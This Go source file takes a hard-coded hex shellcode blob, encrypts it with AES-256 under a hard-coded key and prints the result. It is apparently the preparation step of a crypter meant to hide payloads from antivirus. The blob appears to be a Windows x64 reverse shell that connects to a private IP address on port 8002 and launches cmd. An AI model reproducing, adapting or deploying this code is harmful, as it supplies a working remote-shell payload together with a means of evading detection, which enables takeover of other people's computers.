//go:build windows
// +build windows

package main

import (
	"encoding/hex"
	"fmt"

	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"

	//"encoding/hex"

	"io"
	// Sub Repositories
)

// We learned quite a bit from this post http://stackoverflow.com/questions/18817336/golang-encrypting-a-string-with-aes-and-base64 (Intermernet's answer)

// IsEncryptionOn : A simple system for turning on and off encryption in case you need to see the plain text results in a database for testing (default is On)
var IsEncryptionOn = true

// EncryptByteArray : AES256 encryption function to work with byte arrays
func EncryptByteArray(key, byteArrayToEncrypt []byte) ([]byte, error) {
	if IsEncryptionOn {
		block, err := aes.NewCipher(key)
		if err != nil {
			return nil, err
		}
		ciphertext := make([]byte, aes.BlockSize+len(byteArrayToEncrypt))
		iv := ciphertext[:aes.BlockSize]
		if _, err := io.ReadFull(rand.Reader, iv); err != nil {
			return nil, err
		}
		cfb := cipher.NewCFBEncrypter(block, iv)
		cfb.XORKeyStream(ciphertext[aes.BlockSize:], []byte(byteArrayToEncrypt))
		return ciphertext, nil
	}
	// Encryption was off, just return the string
	return byteArrayToEncrypt, nil
}

var runes = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'.!@#$%^&*(){},=-;+")
var keyLength = 32

func main() {
	fmt.Println("Starting encryption.")

	//Generate password: https://delinea.com/resources/password-generator-it-tool
	key := "c8uDUFabg(ndMVK#%e3NfTPLtEzA5G$&" //32 chars long
	fmt.Println("Key = %s.", key)

	//Place shellcode here without 0x and comma values
	shellcode, errShellcode := hex.DecodeString("fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d49be7773325f3332000041564989e64881eca00100004989e549bc02001f42c0a8327b41544989e44c89f141ba4c772607ffd54c89ea68010100005941ba29806b00ffd550504d31c94d31c048ffc04889c248ffc04889c141baea0fdfe0ffd54889c76a1041584c89e24889f941ba99a57461ffd54881c44002000049b8636d640000000000415041504889e25757574d31c06a0d594150e2fc66c74424540101488d442418c600684889e6565041504150415049ffc0415049ffc84d89c14c89c141ba79cc3f86ffd54831d248ffca8b0e41ba08871d60ffd5bbf0b5a25641baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd5")
	fmt.Println("Original bytes = '%s'.", shellcode)

	encryptedBytes, err := EncryptByteArray([]byte(key), shellcode)
	if errShellcode != nil {
		fmt.Println("Could not encrypt the string: %s", err.Error())
	}

	encodedString := hex.EncodeToString(encryptedBytes)

	fmt.Println("Encrypted bytes = '%s'.", encodedString)
}
